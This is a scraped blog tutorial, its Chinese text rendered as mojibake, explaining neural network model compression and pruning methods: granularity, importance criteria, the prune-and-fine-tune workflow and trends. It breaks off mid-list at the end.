                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ¨¡å‹å‹ç¼©æŠ€æœ¯æ¦‚è¿°</h2>
<h4 data-id="heading-1">1.1 æ¨¡å‹å‹ç¼©é—®é¢˜å®šä¹‰</h4>
<p>å› ä¸ºåµŒå…¥å¼è®¾å¤‡çš„<strong>ç®—åŠ›å’Œå†…å­˜æœ‰é™</strong>ï¼Œå› æ­¤æ·±åº¦å­¦ä¹ æ¨¡å‹éœ€è¦ç»è¿‡æ¨¡å‹å‹ç¼©åï¼Œæ–¹æ‰èƒ½éƒ¨ç½²åˆ°åµŒå…¥å¼è®¾å¤‡ä¸Šã€‚</p>
<p>æ¨¡å‹å‹ç¼©é—®é¢˜çš„å®šä¹‰å¯ä»¥ä»Â <code>3</code>Â è§’åº¦å‡ºå‘:</p>
<ol>
<li>æ¨¡å‹å‹ç¼©çš„æ”¶ç›Š:</li>
</ol>
<ul>
<li><strong>è®¡ç®—</strong>: å‡å°‘[æµ®ç‚¹è¿ç®—é‡]ï¼ˆ<code>FLOPs</code>ï¼‰ï¼Œé™ä½[å»¶è¿Ÿ]ï¼ˆ<code>Latency</code>ï¼‰</li>
<li><strong>å­˜å‚¨</strong>: å‡å°‘å†…å­˜å ç”¨ï¼Œæé«˜Â <code>GPU/NPU</code>Â è®¡ç®—åˆ©ç”¨ç‡</li>
</ul>
<ol start="2">
<li>å…¬å¼å®šä¹‰æ¨¡å‹å‹ç¼©é—®é¢˜:Â </li>
</ol>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dd4c7ec72ed46478381029e8c8c7009~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=iPzTij52hlZnqzJeHecEdn4dts8%3D" alt="d19627e6-4934-47a5-9b32-a9d0acabec0d.png" width="30%" loading="lazy"/></p>
<ol start="4">
<li>æ¨¡å‹å‹ç¼©é—®é¢˜çš„çº¦æŸ:Â </li>
</ol>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbb9a1d233dc4664a761c874c5e82aa1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=%2FdifPPHD7ocrfh69rL7zqu6Nhv4%3D" alt="13610b62-a170-4464-be83-bf576227b795.png" width="50%" loading="lazy"/></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸€å®šç¨‹åº¦ä¸Šï¼Œç½‘ç»œè¶Šæ·±ï¼Œå‚æ•°è¶Šå¤šï¼Œæ¨¡å‹ä¹Ÿä¼šè¶Šå¤æ‚ï¼Œä½†å…¶æœ€ç»ˆæ•ˆæœä¹Ÿè¶Šå¥½ï¼Œè€Œæ¨¡å‹å‹ç¼©ç®—æ³•æ˜¯æ—¨åœ¨å°†ä¸€ä¸ªåºå¤§è€Œå¤æ‚çš„é¢„è®­ç»ƒæ¨¡å‹è½¬åŒ–ä¸ºä¸€ä¸ªç²¾ç®€çš„å°æ¨¡å‹ã€‚</p>
<h4 data-id="heading-2">1.2 æ¨¡å‹å‹ç¼©æ–¹æ³•åˆ†ç±»</h4>
<p>æŒ‰ç…§å‹ç¼©è¿‡ç¨‹å¯¹ç½‘ç»œç»“æ„çš„ç ´åç¨‹åº¦ï¼Œã€Šè§£æå·ç§¯ç¥ç»ç½‘ç»œã€‹ä¸€ä¹¦ä¸­å°†æ¨¡å‹å‹ç¼©æŠ€æœ¯åˆ†ä¸ºâ€œå‰ç«¯å‹ç¼©â€å’Œâ€œåç«¯å‹ç¼©â€ä¸¤éƒ¨åˆ†:</p>
<ul>
<li>å‰ç«¯å‹ç¼©ï¼Œæ˜¯æŒ‡åœ¨ä¸æ”¹å˜åŸç½‘ç»œç»“æ„çš„å‹ç¼©æŠ€æœ¯ï¼Œä¸»è¦åŒ…æ‹¬<code>çŸ¥è¯†è’¸é¦</code>ã€è½»é‡çº§ç½‘ç»œï¼ˆç´§å‡‘çš„æ¨¡å‹ç»“æ„è®¾è®¡ï¼‰ä»¥åŠ<code>æ»¤æ³¢å™¨ï¼ˆfilterï¼‰å±‚é¢çš„å‰ªæï¼ˆç»“æ„åŒ–å‰ªæï¼‰</code>ç­‰ï¼›</li>
<li>åç«¯å‹ç¼©ï¼Œæ˜¯æŒ‡åŒ…æ‹¬<code>ä½ç§©è¿‘ä¼¼</code>ã€æœªåŠ é™åˆ¶çš„å‰ªæï¼ˆéç»“æ„åŒ–å‰ªæ/ç¨€ç–ï¼‰ã€<code>å‚æ•°é‡åŒ–</code>ä»¥åŠäºŒå€¼ç½‘ç»œç­‰ï¼Œç›®æ ‡åœ¨äºå°½å¯èƒ½å‡å°‘æ¨¡å‹å¤§å°ï¼Œä¼šå¯¹åŸå§‹ç½‘ç»œç»“æ„é€ æˆæå¤§ç¨‹åº¦çš„æ”¹é€ ã€‚</li>
</ul>
<p>æ€»ç»“ï¼šå‰ç«¯å‹ç¼©å‡ ä¹ä¸æ”¹å˜åŸæœ‰ç½‘ç»œç»“æ„ï¼ˆä»…ä»…åªæ˜¯åœ¨åŸæ¨¡å‹åŸºç¡€ä¸Šå‡å°‘äº†ç½‘ç»œçš„å±‚æ•°æˆ–è€…æ»¤æ³¢å™¨ä¸ªæ•°ï¼‰ï¼Œåç«¯å‹ç¼©å¯¹ç½‘ç»œç»“æ„æœ‰ä¸å¯é€†çš„å¤§å¹…åº¦æ”¹å˜ï¼Œé€ æˆåŸæœ‰æ·±åº¦å­¦ä¹ åº“ã€ç”šè‡³ç¡¬ä»¶è®¾å¤‡ä¸å…¼å®¹æ”¹å˜ä¹‹åçš„ç½‘ç»œã€‚å…¶ç»´æŠ¤æˆæœ¬å¾ˆé«˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f714c7f6fbf41f6ad9b82135bdf092a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=l3RRPseRefeID0JwjKPrGshcUyY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">å‰ªæå¯¹è±¡ï¼š</h2>
<ul>
<li><strong>æƒé‡å‰ªæï¼ˆWeight Pruningï¼‰</strong>ï¼šç§»é™¤å•ä¸ªæƒé‡ï¼ˆè¿æ¥ï¼‰ï¼Œé€šå¸¸åŸºäºæƒé‡çš„å¤§å°ï¼ˆå¦‚ç»å¯¹å€¼è¾ƒå°çš„æƒé‡è¢«å‰ªé™¤ï¼‰ã€‚è¿™ä¼šå¯¼è‡´ç¨€ç–çŸ©é˜µï¼Œé€‚åˆç¨€ç–è®¡ç®—åŠ é€Ÿã€‚</li>
<li><strong>ç»“æ„åŒ–å‰ªæï¼ˆStructured Pruningï¼‰</strong>ï¼š</li>
</ul>
<ol>
<li>é€šé“å‰ªæï¼ˆChannel Pruningï¼‰ï¼šç§»é™¤æ•´ä¸ªå·ç§¯é€šé“ï¼ˆfiltersï¼‰ï¼Œä¿æŒæ¨¡å‹ç»“æ„è§„åˆ™ï¼Œé€‚åˆé€šç”¨ç¡¬ä»¶åŠ é€Ÿã€‚ï¼ˆ<strong>DepGraphå‰ªæ</strong>ï¼‰</li>
<li>ç¥ç»å…ƒå‰ªæï¼šç§»é™¤æ•´ä¸ªç¥ç»å…ƒæˆ–èŠ‚ç‚¹ã€‚</li>
<li>å±‚å‰ªæï¼šç§»é™¤æ•´ä¸ªç½‘ç»œå±‚ï¼ˆè¾ƒå°‘è§ï¼‰ã€‚</li>
<li>æ··åˆå‰ªæï¼šç»“åˆæƒé‡å’Œç»“æ„åŒ–å‰ªæã€‚</li>
</ol>
<h2 data-id="heading-4">å‰ªæç²’åº¦ï¼š</h2>
<ol>
<li>ç»†ç²’åº¦å‰ªæï¼šæ“ä½œå•ä¸ªæƒé‡ï¼Œçµæ´»ä½†éœ€è¦ç¨€ç–çŸ©é˜µæ”¯æŒã€‚</li>
<li>ç²—ç²’åº¦å‰ªæï¼šæ“ä½œé€šé“ã€å±‚ç­‰ç»“æ„åŒ–å•å…ƒï¼Œç¡¬ä»¶å‹å¥½ä½†å¯èƒ½æŸå¤±æ›´å¤šç²¾åº¦ã€‚</li>
</ol>
<h2 data-id="heading-5">å‰ªæä¾æ®ï¼š</h2>
<ol>
<li>åŸºäºå¹…åº¦ï¼ˆMagnitude-basedï¼‰ï¼šç§»é™¤ç»å¯¹å€¼è¾ƒå°çš„æƒé‡æˆ–é€šé“ï¼Œå‡è®¾å…¶è´¡çŒ®è¾ƒå°ã€‚</li>
<li>åŸºäºé‡è¦æ€§ï¼ˆImportance-basedï¼‰ï¼šé€šè¿‡æŸäº›æŒ‡æ ‡ï¼ˆå¦‚HessiançŸ©é˜µã€æ¢¯åº¦ã€ç‰¹å¾å›¾æ¿€æ´»ï¼‰è¯„ä¼°æƒé‡æˆ–é€šé“çš„é‡è¦æ€§ã€‚</li>
<li>åŸºäºæ­£åˆ™åŒ–ï¼šåœ¨è®­ç»ƒæ—¶å¼•å…¥L1/L2æ­£åˆ™åŒ–ï¼Œé¼“åŠ±æƒé‡è¶‹å‘äºé›¶ï¼Œä¾¿äºåç»­å‰ªæã€‚</li>
</ol>
<h2 data-id="heading-6">å‰ªæç­–ç•¥ï¼š</h2>
<ol>
<li>ä¸€æ¬¡æ€§å‰ªæï¼ˆOne-shot Pruningï¼‰ï¼šåœ¨è®­ç»ƒåç›´æ¥å‰ªæï¼Œç„¶åå¾®è°ƒã€‚</li>
<li>è¿­ä»£å‰ªæï¼ˆIterative Pruningï¼‰ï¼šåˆ†å¤šæ¬¡é€æ­¥å‰ªæï¼Œæ¯è½®å‰ªæåå¾®è°ƒï¼Œç²¾åº¦æŸå¤±è¾ƒå°ã€‚</li>
<li>è®­ç»ƒæ—¶å‰ªæï¼ˆPruning during Trainingï¼‰ï¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­åŠ¨æ€å‰ªæï¼ˆå¦‚é€šè¿‡æ©ç æˆ–æ­£åˆ™åŒ–ï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-7"><strong>ä¸€ã€ æŒ‰å‰ªæçš„â€œç²’åº¦â€åˆ’åˆ†</strong></h2>
<p>â€œå››ä¸ªçº§åˆ«â€æ˜¯ç†è§£å‰ªææŠ€æœ¯çš„å…³é”®ç»´åº¦ï¼Œä»æœ€ç²¾ç»†åˆ°æœ€ç²—ç²’åº¦æ’åˆ—ã€‚</p>
<p>å‰ªæçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>ç§»é™¤ç¥ç»ç½‘ç»œä¸­å†—ä½™æˆ–ä¸é‡è¦çš„å‚æ•°ï¼ˆæƒé‡ï¼‰æˆ–ç»“æ„ï¼Œåœ¨ä¿æŒæ¨¡å‹æ€§èƒ½åŸºæœ¬ä¸å˜çš„å‰æä¸‹ï¼Œå‡å°æ¨¡å‹å¤§å°ã€é™ä½è®¡ç®—å¤æ‚åº¦å’Œå†…å­˜å ç”¨ï¼Œä»è€Œæå‡æ¨ç†é€Ÿåº¦ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f64431c125d74c0a84e324712e33768e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=BNBWb9v6p97ebR92Jp2IM61fy3c%3D" alt="image.png" loading="lazy"/></p>
<p>åˆ é™¤æƒé‡å°äºä¸€å®šé˜ˆå€¼çš„è¿æ¥æˆ–è€…ç¥ç»å…ƒèŠ‚ç‚¹å¾—åˆ°æ›´åŠ ç¨€ç–çš„ç½‘ç»œ</p>
<ul>
<li>Dropout ç±»ä¼¼éç»“æ„åŒ–å‰ªæ å‰ªå»ç¥ç»å…ƒ</li>
<li>DropConnect ç±»ä¼¼ç»“æ„åŒ–å‰ªæ (å‰ªå»è¿æ¥)</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73ef00400f6247c789c4f958f51fc181~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=clhTcVMZGypFr%2FF9vEr%2FYL0K6Ks%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8"><strong>1. éç»“æ„åŒ–å‰ªæ</strong></h3>
<ul>
<li>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šç§»é™¤ç½‘ç»œä¸­<strong>ä¸ªåˆ«</strong>ä¸é‡è¦çš„æƒé‡ï¼ˆå³å°†å…¶ç½®ä¸ºé›¶ï¼‰ï¼Œå½¢æˆç¨€ç–çš„æƒé‡çŸ©é˜µã€‚</p>
</li>
<li>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>ç²’åº¦æœ€ç»†</strong>ï¼šé’ˆå¯¹å•ä¸ªæƒé‡å‚æ•°ã€‚</li>
<li><strong>é«˜ç†è®ºå‹ç¼©ç‡</strong>ï¼šç†è®ºä¸Šå¯ä»¥ç§»é™¤å¤§é‡æƒé‡ã€‚</li>
<li><strong>å®ç°å›°éš¾</strong>ï¼šäº§ç”Ÿçš„ç¨€ç–æ¨¡å¼æ˜¯<strong>ä¸è§„åˆ™ã€éšæœº</strong>çš„ã€‚</li>
<li><strong>ç¡¬ä»¶ä¸å‹å¥½</strong>ï¼šæ ‡å‡†çš„CPU/GPUå’Œæ·±åº¦å­¦ä¹ æ¡†æ¶ï¼ˆå¦‚PyTorch, TensorFlowï¼‰æ˜¯é’ˆå¯¹å¯†é›†çŸ©é˜µè¿ç®—ä¼˜åŒ–çš„ã€‚ç¨€ç–çŸ©é˜µéœ€è¦ç‰¹æ®Šçš„ç¨€ç–å­˜å‚¨æ ¼å¼ï¼ˆå¦‚CSRï¼‰å’Œåº“ï¼ˆå¦‚cuSPARSEï¼‰æ‰èƒ½è·å¾—å®é™…çš„åŠ é€Ÿï¼Œè€Œè¿™é€šå¸¸æ”¯æŒä¸å®Œå–„ï¼Œéš¾ä»¥è¾¾åˆ°ç†è®ºåŠ é€Ÿæ¯”ã€‚</li>
</ul>
</li>
<li>
<p><strong>å…¸å‹æ–¹æ³•</strong>ï¼š</p>
</li>
</ul>
<p><strong>ï¼ˆ1ï¼‰æƒé‡å‰ªæï¼ˆ(Fine-gained) sparsity 0-Dï¼‰</strong>ï¼šç›´æ¥æ ¹æ®æƒé‡çš„ç»å¯¹å€¼ï¼ˆL1èŒƒæ•°ï¼‰æˆ–æ¢¯åº¦ä¿¡æ¯ï¼Œå‰ªæ‰å€¼æ¥è¿‘é›¶çš„æƒé‡ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰ç¥ç»å…ƒå‰ªæ</strong>ï¼šå¯ä»¥è¢«è§†ä¸ºä¸€ç§ç‰¹æ®Šçš„éç»“æ„åŒ–å‰ªæï¼Œé€šè¿‡ç§»é™¤æŸä¸ªç¥ç»å…ƒçš„<strong>æ‰€æœ‰è¾“å…¥å’Œè¾“å‡ºè¿æ¥</strong>æ¥å®ç°ï¼Œä½†å…¶æ•ˆæœç­‰åŒäºç§»é™¤æ•´ä¸ªç¥ç»å…ƒã€‚</p>
<h3 data-id="heading-9"><strong>2. ç»“æ„åŒ–å‰ªæ</strong></h3>
<ul>
<li>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼š<strong>ç§»é™¤æ•´ä¸ªç»“æ„åŒ–çš„ç»„ä»¶</strong>ï¼ˆå¦‚é€šé“ã€æ»¤æ³¢å™¨ã€å±‚ï¼‰ï¼Œä»è€Œç›´æ¥æ”¹å˜ç½‘ç»œçš„å®è§‚æ¶æ„ï¼Œäº§ç”Ÿä¸€ä¸ªæ›´å°ã€æ›´ç´§å‡‘çš„<strong>ç¨ å¯†æ¨¡å‹</strong>ã€‚</p>
</li>
<li>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>ç¡¬ä»¶å‹å¥½</strong>ï¼šè¾“å‡ºçš„æ¨¡å‹ä»ç„¶æ˜¯è§„åˆ™çš„ç¨ å¯†ç½‘ç»œï¼Œå¯ä»¥ç›´æ¥è¢«ç°æœ‰ç¡¬ä»¶å’Œæ¡†æ¶é«˜æ•ˆæ”¯æŒï¼Œæ— éœ€ç‰¹æ®Šåº“ï¼Œ<strong>èƒ½è·å¾—ç¡®å®šçš„ã€çº¿æ€§çš„åŠ é€Ÿ</strong>ã€‚</li>
<li><strong>ç²’åº¦è¾ƒç²—</strong>ï¼šå‹ç¼©ç‡å’Œç²¾åº¦æŸå¤±ä¹‹é—´éœ€è¦æ›´ç²¾ç»†çš„æƒè¡¡ã€‚</li>
</ul>
</li>
<li>
<p><strong>å…¸å‹æ–¹æ³•</strong>ï¼ˆä»ç»†åˆ°ç²—ï¼‰ï¼š</p>
</li>
</ul>
<h4 data-id="heading-10"><strong>ï¼ˆ1ï¼‰é€šé“å‰ªæ</strong>ï¼š</h4>
<p>ä¸»è¦é’ˆå¯¹<strong>å·ç§¯ç¥ç»ç½‘ç»œ</strong>ã€‚ç§»é™¤ç‰¹å¾å›¾ä¸­çš„æ•´ä¸ªé€šé“ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå½¢çŠ¶ä¸ºÂ <code>[C_out, C_in, K, K]</code>Â çš„å·ç§¯æ ¸ï¼Œè‹¥ç§»é™¤å…¶è¾“å…¥é€šé“Â <code>C_in</code>Â ä¸­çš„ç¬¬Â <code>i</code>Â ä¸ªï¼Œåˆ™å¯¹åº”æ‰€æœ‰æ»¤æ³¢å™¨çš„ç¬¬Â <code>i</code>Â ä¸ªé€šé“éƒ½è¢«ç§»é™¤ï¼›è‹¥ç§»é™¤è¾“å‡ºé€šé“Â <code>C_out</code>Â ä¸­çš„ç¬¬Â <code>j</code>Â ä¸ªï¼Œåˆ™æ•´ä¸ªç¬¬Â <code>j</code>Â ä¸ªæ»¤æ³¢å™¨è¢«ç§»é™¤ã€‚</p>
<h4 data-id="heading-11"><strong>ï¼ˆ2ï¼‰æ»¤æ³¢å™¨å‰ªæ</strong>ï¼š</h4>
<p>å¯ä»¥çœ‹ä½œæ˜¯é€šé“å‰ªæçš„ç‰¹ä¾‹ï¼Œç›´æ¥ç§»é™¤æ•´ä¸ªæ»¤æ³¢å™¨ï¼ˆå³è¾“å‡ºé€šé“ï¼‰ã€‚è¿™ä¼šå‡å°‘ä¸‹ä¸€å±‚è¾“å…¥é€šé“çš„æ•°é‡ï¼Œå› æ­¤éœ€è¦åŒæ­¥å‰ªæ‰ä¸‹ä¸€å±‚å·ç§¯æ ¸çš„å¯¹åº”è¾“å…¥é€šé“ã€‚</p>
<h4 data-id="heading-12"><strong>ï¼ˆ3ï¼‰å±‚çº§åˆ«å‰ªæ</strong>ï¼š</h4>
<p><strong>ç²’åº¦æœ€ç²—</strong>ã€‚ç›´æ¥ç§»é™¤ç½‘ç»œä¸­çš„æ•´ä¸ªå±‚ï¼ˆä¾‹å¦‚ï¼Œæ®‹å·®ç½‘ç»œä¸­çš„æŸäº›æ®‹å·®å—ï¼‰ã€‚è¿™éœ€è¦æ¨¡å‹æœ¬èº«æœ‰ä¸€å®šå†—ä½™æ·±åº¦ï¼Œå¹¶ä¸”å¯¹ç½‘ç»œæ‹“æ‰‘ç»“æ„å½±å“è¾ƒå¤§ï¼Œéœ€è°¨æ…è®¾è®¡ã€‚</p>
<h2 data-id="heading-13"><strong>äºŒã€ å…³é”®æŠ€æœ¯æµç¨‹ä¸å…±åŒæ­¥éª¤</strong></h2>
<p>æ— è®ºå“ªç§å‰ªæç²’åº¦ï¼Œä¸€ä¸ªå®Œæ•´çš„å‰ªææµç¨‹é€šå¸¸åŒ…å«ä»¥ä¸‹æ ¸å¿ƒæ­¥éª¤ï¼š</p>
<ol>
<li>
<p><strong>é¢„è®­ç»ƒ</strong>ï¼šé¦–å…ˆåœ¨ç›®æ ‡ä»»åŠ¡ä¸Šè®­ç»ƒä¸€ä¸ªå¤§å‹çš„ã€è¿‡å‚æ•°åŒ–çš„æ¨¡å‹ï¼Œç›´è‡³æ”¶æ•›ã€‚</p>
</li>
<li>
<p><strong>é‡è¦æ€§è¯„ä¼°</strong>ï¼š<strong>è¿™æ˜¯å‰ªæçš„æ ¸å¿ƒå†³ç­–ç¯èŠ‚</strong>ã€‚å®šä¹‰ä¸€ä¸ªæ ‡å‡†æ¥åˆ¤æ–­å“ªäº›å‚æ•°æˆ–ç»“æ„æ˜¯â€œä¸é‡è¦â€çš„ã€‚</p>
<ul>
<li>
<p><strong>å¸¸ç”¨å‡†åˆ™</strong>ï¼š</p>
<ul>
<li><strong>æƒé‡ç»å¯¹å€¼</strong>ï¼šè®¤ä¸ºç»å¯¹å€¼å°çš„æƒé‡ä¸é‡è¦ï¼ˆéç»“æ„åŒ–å¸¸ç”¨ï¼‰ã€‚</li>
<li><strong>L1/L2èŒƒæ•°</strong>ï¼šè®¡ç®—æ»¤æ³¢å™¨æˆ–é€šé“çš„æƒé‡èŒƒæ•°ï¼ŒèŒƒæ•°å°çš„è¢«è®¤ä¸ºä¸é‡è¦ï¼ˆç»“æ„åŒ–å¸¸ç”¨ï¼‰ã€‚</li>
<li><strong>åŸºäºæ¢¯åº¦/æ¿€æ´»</strong>ï¼šåˆ†ææ¢¯åº¦ä¿¡æ¯æˆ–æ¿€æ´»å€¼çš„ç»Ÿè®¡é‡ï¼ˆå¦‚å¹³å‡æ¿€æ´»å€¼ä¸ºé›¶çš„é€šé“ï¼‰ã€‚</li>
<li><strong>åŸºäºé‡å»ºè¯¯å·®</strong>ï¼šè¯•å›¾æœ€å°åŒ–å‰ªæå‰åç‰¹å¾å›¾æˆ–è¾“å‡ºç»“æœçš„å·®å¼‚ã€‚</li>
<li><strong>åˆ©ç”¨BNå±‚ç¼©æ”¾å› å­</strong>ï¼šåœ¨é€šé“å‰ªæä¸­ï¼ŒBNå±‚çš„ç¼©æ”¾å› å­Î³å¯ä»¥å¾ˆå¥½åœ°ä»£è¡¨é€šé“çš„é‡è¦æ€§ï¼ŒÎ³æ¥è¿‘é›¶çš„é€šé“å¯è¢«å‰ªæï¼ˆå¦‚Network Slimmingæ–¹æ³•ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>å‰ªæ</strong>ï¼šæ ¹æ®è¯„ä¼°å‡†åˆ™å’Œé¢„è®¾çš„å‰ªææ¯”ä¾‹ï¼ˆå…¨å±€æˆ–é€å±‚ï¼‰ï¼Œç§»é™¤ä¸é‡è¦çš„éƒ¨åˆ†ã€‚</p>
</li>
<li>
<p><strong>å¾®è°ƒ/å†è®­ç»ƒ</strong>ï¼šå¯¹å‰ªæåçš„æ¨¡å‹è¿›è¡Œé‡æ–°è®­ç»ƒï¼Œä»¥æ¢å¤æŸå¤±çš„ç²¾åº¦ã€‚è¿™æ˜¯ä¸€ä¸ªâ€œå‰ªæ-å¾®è°ƒâ€çš„è¿­ä»£è¿‡ç¨‹ï¼Œå¯ä»¥é‡å¤å¤šæ¬¡ã€‚</p>
</li>
<li>
<p><strong>éƒ¨ç½²</strong>ï¼šå°†å‰ªæåçš„å°æ¨¡å‹éƒ¨ç½²åˆ°ç›®æ ‡è®¾å¤‡ä¸Šã€‚</p>
</li>
</ol>
<h2 data-id="heading-14"><strong>ä¸‰ã€ è¯¦ç»†å¯¹æ¯”ä¸æ€»ç»“</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f031467aed84f968f7981031e124660~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JyX54mb6KGM6L-5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770279326&amp;x-signature=G28Rrx1T2URvahvH1sTjcHzIBt0%3D" alt="0ad6d412-2801-4e2d-83f3-87de55c102d7.png" loading="lazy"/></p>
<h2 data-id="heading-15"><strong>å››ã€ å‘å±•è¶‹åŠ¿ä¸æŒ‘æˆ˜</strong></h2>
<ol>
<li>
<p><strong>è‡ªåŠ¨åŒ–ä¸è”åˆä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>å°†å‰ªæä¸<strong>ç¥ç»ç½‘ç»œæ¶æ„æœç´¢</strong>ç»“åˆï¼Œè‡ªåŠ¨å¯»æ‰¾æœ€ä¼˜çš„ç¨€ç–ç»“æ„ã€‚</li>
<li><strong>ä¸€æ¬¡æ€§å‰ªæ</strong>ï¼šé¿å…ç¹ççš„è¿­ä»£å‰ªæ-å¾®è°ƒæµç¨‹ã€‚</li>
<li><strong>è®­ç»ƒä¸å‰ªæåŒæ­¥</strong>ï¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­å°±å¼•å…¥ç¨€ç–æ€§ï¼ˆå¦‚åˆ©ç”¨L1æ­£åˆ™åŒ–ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç¡¬ä»¶ååŒè®¾è®¡</strong>ï¼š
è®¾è®¡æ”¯æŒé«˜æ•ˆç¨€ç–è®¡ç®—çš„<strong>ä¸“ç”¨AIèŠ¯ç‰‡</strong>ï¼ˆå¦‚æŸäº›NPUï¼‰ï¼Œä»¥é‡Šæ”¾éç»“æ„åŒ–å‰ªæçš„æ½œåŠ›ã€‚</p>
</li>
<li>
